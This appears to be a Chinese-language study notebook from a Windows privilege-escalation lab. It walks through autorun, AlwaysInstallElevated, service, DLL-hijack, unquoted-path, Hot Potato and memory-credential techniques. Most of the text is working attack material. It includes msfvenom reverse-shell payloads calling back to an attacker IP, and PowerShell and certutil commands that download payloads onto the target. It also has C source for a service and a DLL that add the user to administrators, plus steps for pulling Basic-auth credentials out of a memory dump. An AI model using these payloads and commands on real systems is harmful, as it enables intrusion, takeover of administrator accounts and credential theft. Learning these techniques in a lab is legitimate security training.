
# rdp连接
user登录
> rdesktop -u user -p password321 10.10.54.152 -r sound:on -g workarea

TCM登录
> rdesktop -u TCM -p Hacker123 10.10.54.152 -r sound:on -g workarea


为了方便起见，应该先传一些实用工具到靶机。

1. 传nc.exe到靶机

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/nc.exe','C:\temp\nc.exe')"

certutil -urlcache -split -f "http://192.168.49.102/JuicyPotato.exe" JuicyPotato.exe

2. 从靶机传文件回kali

接收端：
> nc -nlp 9995 -vv > iexplore.DMP

发送端：（需在cmd下）
nc -n 10.13.21.169 9995 < iexplore.DMP



# 1.注册表提权-自动运行（ Registry Escalation - Autorun）

## 前提
1. Autorun文件可写（可替换）
2. 需要另一个用户登录才会触发

## 思路
Autorun，就是启动时自动运行，这个思路时通过修改注册表里的二进制文件（用msfvenom生成一个同名的反弹shell文件），替换原有的二进制文件。当其他用户登录系统时，触发注册表里的Autorun文件，从而执行我们替换的payload，然后我们就得到了登录用户的权限。


## 怎么利用?

靶机：
1. 运行Autoruns64.exe检查自动运行的文件。（Open command prompt and type: C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe）
2. 点击登录选项（In Autoruns, click on the ‘Logon’ tab.）
3. 在显示的结果当中，留意“我的程序”指向的二进制文件。（From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.）
4. 用accesschk64.exe检查这个Autorun文件的读写权限。（ In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"）
5. 从上面的检查结果中可以知道所有人对这个Autorun文件有读写权限（From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.）

攻击机：
监听
1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run

用msfvenom编译同名Autorun文件：

> msfvenom -p windows/meterpreter/reverse_tcp lhost=10.13.21.169 lport=4444 -f exe -o program.exe


从靶机下载文件program.exe
> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/program.exe','C:\Program Files\Autorun Program\program.exe')"

等待用户登录，触发反弹shell。


# 2.注册表提权-AlwaysInstallElevated (Registry Escalation - AlwaysInstallElevated)

## 前提
如果注册表里查询到这两个属性的值都是 0x1，那么任何用户都拥有以``` NT AUTHORITY\SYSTEM```身份运行或者安装```*.msi```文件的权限
>  reg query HKLM\Software\Policies\Microsoft\Windows\Installer

>  reg query HKCU\Software\Policies \Microsoft\Windows\Installer

## 思路
用msfvenom生成一个```*.msi```文件，在靶机里执行这个文件，就可以提权到```NT AUTHORITY\SYSTEM```

## 怎么利用?

### 攻击机：
监听
1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run

6. 生成反弹的.msi文件
> msfvenom -p windows/meterpreter/reverse_tcp lhost=10.13.21.169 lport=4444 -f msi -o setup.msi

### 靶机：
7. 从靶机下载文件
> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/setup.msi','C:\temp\setup.msi')"

8. 执行```setup.msi```文件

攻击机收到反弹shell，拿到最高权限
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.13.21.169:4444 
[*] Sending stage (175174 bytes) to 10.10.86.123
[*] Meterpreter session 2 opened (10.13.21.169:4444 -> 10.10.86.123:49329) at 2021-11-15 09:22:26 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

# 3.服务提权-注册表（Service Escalation - Registry）

## 前提

使用下面ps命令查看：
> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

满足属于```NT AUTHORITY\INTERACTIVE```的用户拥有```FullContol```的权限

## 思路

如果拥有修改修改服务注册表的权限，那么就可以通过修改这个服务将要执行的二进制文件进行提权。

## 怎么利用?

将```C:\Users\User\Desktop\Tools\Source\windows_service.c```文件拷贝到kail

1. system里面的命令变为：```cmd.exe /k net localgroup administrators user /add```
```
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 

//add the payload here
int Run() 
{ 
    system("cmd.exe /k net localgroup administrators user /add");
    return 0; 
} 

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
 
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
    Run(); 
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
 
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
		Sleep(SLEEP_TIME);
    }
    return; 
}

void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
			ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
    SetServiceStatus (hStatus,  &ServiceStatus);
    return; 
} 



```

2. 编译文件
> x86_64-w64-mingw32-gcc windows_service.c -o x.exe 

3. 把x.exe文件传回靶机。放到```C:\Temp```下面
> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/x.exe','C:\temp\x.exe')"

4. 命令行输入：
>  reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f

5. 开启服务：
> sc start regsvc

现在查看admin用户组，就可以看到本账户已经被添加到administrators组：
> net localgroup administrators

# 4.服务提权-可执行文件（Service Escalation - Executable Files）

## 前提
1. 用```accesschk64.exe```检查某个服务的权限，这里选择```C:\Program Files\File Permissions Service```
> C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"

2. 如果文件``` filepermservice.exe```对所有人都有```FILE_ALL_ACCESS```权限

3. 有重启这个服务的权限

## 思路

我觉得跟上面那个注册服务的思路是一样的。1要对服务有写入权限，2可以重启这个服务。

## 怎么利用?

1. 把上面生成的那个反弹shell文件拷贝到目标服务
>  copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"

2. 重启服务
> sc start filepermsvc

3. 查看管理员组，当前账号是否被添加进该组
> net localgroup administrators

# 5.权限提升-启动应用程序

## 前提
1. 对启动应用程序目录有写入权限。
> icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

2. 如果```BUILTIN\Users```组对这个文件夹拥有``` full access ‘(F)’ ```

3. 必须等待管理员登陆。

## 思路

```"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"```就是开机启动程序所在的文件夹，在这里写一个反弹shell，等待管理员登陆以后就可以收到管理员的shell。

## 怎么利用?

攻击端：
1. 开启监听
> msfconsole

> use multi/handler

> set payload windows/meterpreter/reverse_tcp

> set lhost [Kali VM IP Address]

> run

2. 生成反弹shell
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.21.169 LPORT=4444 -f exe -o reverse.exe

靶机端：
1. 下载反弹shell到开机启动程序目录
> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.13.21.169:8000/reverse.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverse.exe')"



等待管理员登陆。

# 6.服务提权-DLL劫持（Service Escalation - DLL Hijacking）

## 前提
1. 知道某个服务缺少DLL文件

2. 这个DLL文件所在的目录是可写的

3. 可以重启这个服务

## 思路
DLL就是windows下的动态连接库，它不可以被直接执行，仅供应用程序调用。有时候系统会缺少某些不太重要的DLL库，此时就可以制造一个恶意的DLL库劫持掉应用程序调用，执行恶意代码进行提权。

## 如何利用

模板DLL利用代码：
```
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

把system里面的命令换成想要执行的命令即可，例如可以把当前账号添加进管理员用户组：```cmd.exe /k net localgroup administrators user /add```

编译成DLL文件：
> x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll


# 7.服务升级-binPath（Service Escalation - binPath）

## 前提
1. ```accesschk64.exe```检查某个服务的权限时，当前账号拥有对这个服务的```SERVICE_CHANGE_CONFIG```权限,这里选择```daclsvc```服务
> C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc

2. 可以重启这个服务。

## 思路
binPath原本是指服务的二进制路径，但是它作为参数时也可以执行系统的命令。详细参考[hacktricks](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#modify-service-binary-path)

## 如何利用
1. 把当前账号加入到管理员用户组
> sc config daclsvc binpath= "net localgroup administrators user /add"

2. 重启服务
> sc start daclsvc


# 8.服务升级-未加引号的服务路径(Service Escalation - Unquoted Service Paths)

## 前提

1. ```sc qc 服务名称```，在```BINARY_PATH_NAME```一栏中，路径没有引号，这里选择```unquotedsvc```服务
> sc qc unquotedsvc

显示：
```

C:\Users\user>sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files
\unquotedpathservice.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\Users\user>sc qc cmd
[SC] OpenService FAILED 1060:

The specified service does not exist as an installed service.

```

2. 可以重启这个服务。

3. 能够在利用路径写入文件。


## 思路

一个正常程序路径，比如：

```C:\Program Files\topservice folder\subservice subfolder\srvc.exe```

windows读取的应该是```C:\Program Files\topservice folder\subservice subfolder```的```srvc.exe```程序

但是有一种情况是，假如这个路径没有加引号，那么windows对于这个路径的读取处理依次为：

1. C:\Program.exe
2. C:\Program Files\topservice.exe
3. C:\Program Files\topservice folder\subservice.exe

即读取最近那个路径的第一个单词的同名exe文件，知道了这一点，如果我们可以将一个可执行文件放在我们知道服务正在寻找的位置，它可能由服务运行。 

## 如何利用

1. 生成一个可以利用的二进制反弹shell

> msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.21.169 LPORT=4444 -f exe > common.exe

2. 在靶机里把该文件下载到可以使用的路径当中
> wget -O common.exe 10.13.21.169:8000/common.exe


3. 重启服务
> sc start 服务名称


# 9.热土豆升级（ Potato Escalation - Hot Potato）

> Hot Potato主要由三大部分组成，每一部分都对应一个已知类型的攻击技术，这些技术并不算新颖，但是使用这些技术的方式却令人耳目一新。微软已经深知这些攻击技术，不幸的是，在不破坏系统向后兼容性的情况下，这些问题很难被修复，所以攻击者已经使用这些技术很多年了。

## 如何利用

1. 调出powershell
> powershell.exe -nop -ep bypass

2. 引入热土豆模块(脚本在[这里](https://github.com/Kevin-Robertson/Tater))
> Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1

3. 执行自定义命令。把当前账号提权到管理员组
>  Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"

4. 查看
> net localgroup administrators


# 10.配置文件里的密码（Password Mining Escalation - Configuration Files）

就是查找靶机里存有密码的配置文件，有些可能是明文，有些可能被加密了。


# 11.内存文件里的密码

## 如何利用

kali端：
首先用MSF开启一个监听
> msfconsole

> use auxiliary/server/capture/http_basic

> set uripath x

>  run

此时生成一个http监听：```http://10.13.21.169/x```

靶机：

1. 访问上面的监听地址。

2. 打开任务管理器
> taskmgr

3. 导出dumo file(Create Dump File)

4. 把导出来的文件传回kali

kali端：

1. 用strings命令查看导出来的dump file,搜索Authorization: Basic
> strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"

2. base64解密
> echo -ne [Base64 String] | base64 -d


# 12.内核提权（Kernel Exploits）

1. 利用MSF里面的``` post/multi/recon/local_exploit_suggester```模块

2. 自己编译提权脚本传到靶机执行。

注意，内核提权有可能会损伤系统造成不可修复的破坏，在真实环境中应该作为最后谨慎使用的手段。
